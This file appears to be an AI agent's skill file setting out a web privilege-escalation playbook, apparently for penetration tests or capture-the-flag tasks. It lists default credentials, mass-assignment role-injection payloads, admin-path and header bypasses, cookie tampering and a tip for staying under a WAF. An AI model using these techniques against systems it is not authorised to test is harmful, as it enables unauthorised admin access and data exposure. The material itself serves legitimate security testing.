---
name: privilege-escalation-web
description: "Web application layer privilege escalation. Use when a web application has user registration/login, role and permission management, or API parameters carrying user identity information. Covers Mass Assignment attacks, role/permission field injection, HTTP method/header bypass, and cookie/session tampering. Immediately after registration, check whether a normal user can reach admin functionality via broken access control — this is the first priority"
zh-signals: "Web 应用层权限提升，覆盖 Mass Assignment、角色/权限字段注入、HTTP 方法/Header 绕过与 Cookie/Session 篡改。信号:越权,Mass Assignment,角色注入,权限绕过,Session篡改,RBAC"
when-to-use: >-
  Use when a web application has user registration/login, role-based access control, or
  API parameters carrying user identity, and you need to test mass assignment, role
  injection, header bypass, or cookie/session tampering for privilege escalation.
metadata:
  tags: "privilege_escalation,mass_assignment,authorization,role-tampering,default_credentials,broken_access_control,RBAC,admin bypass,privilege_bypass"
  category: "exploit"
---

# Web Privilege Escalation Methodology

Web privilege escalation differs from system privilege escalation — it requires no exploit, only finding flaws in the application's authorization checks.

## ⛔ Further Reading (Must Read)

- Mass Assignment field list, HTTP header tampering, cookie tampering → [references/web-privesc-techniques.md](references/web-privesc-techniques.md)

## Phase 1: Authentication and Account Discovery

### Default Credentials (Fastest Path)
```
admin:admin, admin:password, admin:123456
root:root, root:toor, test:test, guest:guest
```

### Registration Function Analysis
Register a new account, intercept the request with a proxy, and record the request format, the fields sent, and the response fields (hidden field names may be exposed).
Check `/docs`, `/swagger`, `/openapi.json`.

## Phase 2: Mass Assignment (Core Technique)

In registration or update requests, **add fields the application does not expect** (only one at a time):
```json
{"username":"test", "password":"pass", "role":"admin"}
{"username":"test", "password":"pass", "is_admin":true}
{"username":"test", "password":"pass", "is_staff":1}
```

→ full field list and framework conventions → [references/web-privesc-techniques.md](references/web-privesc-techniques.md)

## Phase 3: Direct Access to Admin Endpoints
```
GET /admin → 403? → try /admin/ (trailing slash) or /Admin (case variation)
GET /api/admin/users → 200?
```

## Phase 4: HTTP Method/Header Tampering + Cookie Tampering

```
GET /admin/flag → 403 → try POST/PUT/PATCH
Header: X-Original-URL: /admin/flag / X-Forwarded-For: 127.0.0.1
Cookie: role=user → role=admin / admin=0 → admin=1
```
→ full payloads and Flask session forgery → [references/web-privesc-techniques.md](references/web-privesc-techniques.md)

## Phase 5: Object-Level Broken Access Control
Modify the ID in the URL/parameters to access another user's resources

## Notes
- With Mass Assignment change only one field at a time — changing all of them may trigger a WAF
- After registration, check `GET /api/users/me` to confirm whether privileges really changed
- Combining IDOR with Mass Assignment works better
